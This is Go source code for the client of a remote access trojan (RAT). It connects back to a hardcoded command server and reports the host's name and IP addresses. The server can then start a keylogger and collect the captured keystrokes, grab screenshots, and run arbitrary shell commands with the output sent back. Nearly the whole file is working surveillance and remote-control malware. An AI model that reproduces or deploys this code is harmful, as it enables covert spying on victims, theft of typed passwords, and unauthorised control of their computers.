package main

import (
	"fmt"
	"net"
	"os"
	"strings"
	"time"

	"wpg.ratcli/client/cmd"
	"wpg.ratcli/client/keyinfo"
	"wpg.ratcli/client/screenshot"
	"wpg.ratcli/client/systeminfo"
)

const (
	IP   = "127.0.0.1"
	PORT = "7782"
)

var (
	buffer  = make([]byte, 1024)
	message string
)

func main() {
	start()
}

func start() {
	for {
		conn, err := net.Dial("tcp", IP+":"+PORT)
		if err != nil {
			fmt.Println(err)
			time.Sleep(5 * time.Second)
			continue
		}
		hostname, wlanip, lanip := systeminfo.GetSystem()
		conn.Write([]byte(hostname + "|" + wlanip + "|" + lanip))
		for {
			length, err := conn.Read(buffer)
			if err != nil {
				// os.Exit(1)
				continue
			}
			message = string(buffer[:length])
			fmt.Println(message)

			if strings.HasPrefix(message, "keystart") {
				go keyinfo.StartKeyInfo()
				conn.Write([]byte("start keylogger success"))
			}

			if strings.HasPrefix(message, "keyget") {
				fmt.Println("get keyinfo")
				filebyte := keyinfo.GetKeyInfo()
				if filebyte != nil {
					conn.Write(filebyte)
				} else {
					fmt.Println("获取到空文件？")
				}
			}

			if strings.HasPrefix(message, "screen") {
				fmt.Println("获取截图...")
				filebyte := screenshot.GetScreen()
				if filebyte == nil {

				} else {
					conn.Write(filebyte)
				}
			}

			if strings.HasPrefix(message, "cmd") {
				command := strings.Split(message, "|")[1]
				fmt.Println("执行cmd命令：", command)
				output := cmd.ExecCommand(command)
				if err != nil {
					conn.Write([]byte("exec error"))
				} else {
					conn.Write([]byte(output))
				}
			}

			if strings.HasPrefix(message, "upload") {
				fmt.Println("文件上传")
			}

			if strings.HasPrefix(message, "download") {
				fmt.Println("文件下载")
			}

			if strings.HasPrefix(message, "close") {
				conn.Close()
				// 关闭自动启动
				os.Exit(1)
			}
		}
	}
}
